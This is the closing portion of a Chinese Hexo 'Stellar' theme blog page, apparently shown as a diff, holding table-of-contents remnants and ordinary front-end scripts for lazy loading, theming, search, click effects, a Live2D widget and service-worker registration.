class="toc-text">3. 安全配置的影响</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">九、总结</span></a></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    document.documentElement.setAttribute('data-theme', theme)
+  }
+
+  const switchTheme = () => {
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    if (currentTheme === 'light') {
+      newTheme = 'dark'
+    } else {
+      newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      applyTheme('dark')
+    }
+  })()
+</script>
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+
+<!-- Custom Image Viewer -->
+<script src="/js/plugins/image-viewer.js"></script>
+
+<!-- Custom Context Menu -->
+<script src="/js/plugins/custom-context-menu.js"></script>
+
+<!-- Glitch Effect -->
+<script src="/js/plugins/glitch-effect.js"></script>
+
+<!-- Terminal Copy -->
+<script src="/js/plugins/terminal-copy.js"></script>
+
+<!-- Hotkeys -->
+<script src="/js/plugins/hotkeys.js"></script>
+
+<!-- Achievements / Card System -->
+<script src="/js/plugins/achievements.js"></script>
+
+<!-- Special Days - 节日彩蛋系统 -->
+<script src="/js/plugins/special-days.js"></script>
+
+<!-- Music Player -->
+<script src="/js/plugins/music-player.js"></script>
+
+<!-- Offline Vault - 断网保护机制 -->
+<script src="/js/plugins/offline-vault.js"></script>
+
+<!-- Live2D Widget - Local Version -->
+<script src="/live2d-widget/dist/autoload.js"></script>
+
+<!-- Live2D Widget 位置调整和默认显示 -->
+<style>
+  #waifu {
+    position: fixed !important;
+    bottom: 20px !important;
+    right: 20px !important;
+    left: auto !important;
+    z-index: 1000 !important;
+    transform: none !important;
+    display: block !important;
+    opacity: 1 !important;
+    visibility: visible !important;
+  }
+  #waifu #live2d {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toolbar {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toggle {
+    display: none !important;
+  }
+</style>
+
+<!-- 点击特效 -->
+<script>
+(function() {
+  var clickEffects = {
+    current: null,
+    
+    init: function() {
+      this.current = localStorage.getItem('clickEffect') || 'none';
+      this.bindEvents();
+    },
+    
+    bindEvents: function() {
+      var self = this;
+      document.addEventListener('click', function(e) {
+        if (self.current === 'none') return;
+        if (e.target.closest('button, a, input, textarea, select, .post-card, .layout-btn')) return;
+        self.createEffect(e.clientX, e.clientY);
+      });
+      
+      window.addEventListener('storage', function(e) {
+        if (e.key === 'clickEffect') {
+          self.current = e.newValue || 'none';
+        }
+      });
+    },
+    
+    createEffect: function(x, y) {
+      switch(this.current) {
+        case 'ripple': this.createRipple(x, y); break;
+        case 'firework': this.createFirework(x, y); break;
+        case 'particles': this.createParticles(x, y); break;
+        case 'text': this.createText(x, y); break;
+        default: break;
+      }
+    },
+    
+    createRipple: function(x, y) {
+      var ripple = document.createElement('div');
+      ripple.className = 'click-ripple';
+      ripple.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;width:0;height:0;border-radius:50%;background:rgba(52,152,219,0.4);transform:translate(-50%,-50%);pointer-events:none;z-index:9999;animation:rippleExpand 0.6s ease-out forwards;';
+      document.body.appendChild(ripple);
+      setTimeout(function() { ripple.remove(); }, 600);
+    },
+    
+    createFirework: function(x, y) {
+      var colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff'];
+      for (var i = 0; i < 12; i++) {
+        var particle = document.createElement('div');
+        var angle = (Math.PI * 2 / 12) * i;
+        var velocity = 50 + Math.random() * 30;
+        particle.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;width:6px;height:6px;border-radius:50%;background:' + colors[i % 5] + ';pointer-events:none;z-index:9999;transform:translate(-50%,-50%);';
+        document.body.appendChild(particle);
+        this.animateParticle(particle, x, y, x + Math.cos(angle) * velocity, y + Math.sin(angle) * velocity, 500);
+      }
+    },
+    
+    createParticles: function(x, y) {
+      var colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff', '#5f27cd'];
+      for (var i = 0; i < 8; i++) {
+        var particle = document.createElement('div');
+        particle.innerHTML = '✨';
+        particle.style.cssText = 'position:fixed;left:' + (x + (Math.random()-0.5)*30) + 'px;top:' + (y + (Math.random()-0.5)*30) + 'px;font-size:16px;pointer-events:none;z-index:9999;animation:particleFloat 0.8s ease-out forwards;';
+        document.body.appendChild(particle);
+        setTimeout(function(p) { return function() { p.remove(); }; }(particle), 800);
+      }
+    },
+    
+    createText: function(x, y) {
+      var texts = ['666', '厉害', 'nice', '棒', '赞', '给力'];
+      var text = document.createElement('div');
+      text.innerHTML = texts[Math.floor(Math.random() * texts.length)];
+      text.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;font-size:18px;font-weight:bold;color:#3498db;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);animation:textFloat 0.8s ease-out forwards;';
+      document.body.appendChild(text);
+      setTimeout(function() { text.remove(); }, 800);
+    },
+    
+    animateParticle: function(el, startX, startY, endX, endY, duration) {
+      var startTime = performance.now();
+      function animate(currentTime) {
+        var progress = Math.min((currentTime - startTime) / duration, 1);
+        var easeOut = 1 - Math.pow(1 - progress, 3);
+        el.style.left = (startX + (endX - startX) * easeOut) + 'px';
+        el.style.top = (startY + (endY - startY) * easeOut) + 'px';
+        el.style.opacity = 1 - progress;
+        if (progress < 1) requestAnimationFrame(animate);
+        else el.remove();
+      }
+      requestAnimationFrame(animate);
+    }
+  };
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', function() { clickEffects.init(); });
+  } else {
+    clickEffects.init();
+  }
+  
+  window.ClickEffects = clickEffects;
+})();
+</script>
+
+<style>
+@keyframes rippleExpand {
+  0% { width: 0; height: 0; opacity: 1; }
+  100% { width: 100px; height: 100px; opacity: 0; }
+}
+@keyframes particleFloat {
+  0% { opacity: 1; transform: translateY(0) scale(1); }
+  100% { opacity: 0; transform: translateY(-40px) scale(0.5); }
+}
+@keyframes textFloat {
+  0% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+  100% { opacity: 0; transform: translate(-50%, -80px) scale(1.2); }
+}
+</style>
+
+<!-- PWA Service Worker -->
+<script>
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.register('/sw.js').then(function(reg) {
+    console.log('Service Worker 已注册，支持离线访问');
+  }).catch(function(err) {
+    console.log('Service Worker 注册失败:', err);
+  });
+}
+</script>
+
+<!-- Random Cover Image -->
+<script>
+(function() {
+  function refreshRandomCovers() {
+    var images = document.querySelectorAll('img[src*="loliapi.com"]');
+    images.forEach(function(img) {
+      var src = img.src;
+      var baseSrc = src.split('?')[0];
+      img.src = baseSrc + '?t=' + Date.now() + '&r=' + Math.random().toString(36).substr(2, 9);
+    });
+  }
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', refreshRandomCovers);
+  } else {
+    refreshRandomCovers();
+  }
+})();
+</script>
+
+</div></body></html>
